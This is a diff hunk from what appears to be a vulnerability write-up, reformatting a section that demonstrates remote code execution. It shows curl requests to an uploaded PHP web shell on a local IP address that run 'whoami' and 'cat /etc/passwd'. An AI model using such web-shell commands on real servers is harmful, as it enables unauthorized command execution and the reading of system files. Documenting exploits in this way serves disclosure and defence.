@@ -228,7 +228,8 @@ Stack trace:
 
 ```
 
-RCE Request Performed:
+### RCE 
+Request Performed:
 
 ```bash
 curl http://192.168.1.193:8080/export/smithbraz.php?cmd=whoami
@@ -239,6 +240,8 @@ Response:
 ```http
 www-data
 ```
+
+Request Performed:
 
 ```bash
 curl http://192.168.1.193:8080/export/smithbraz.php?cmd=cat+/etc/passwd
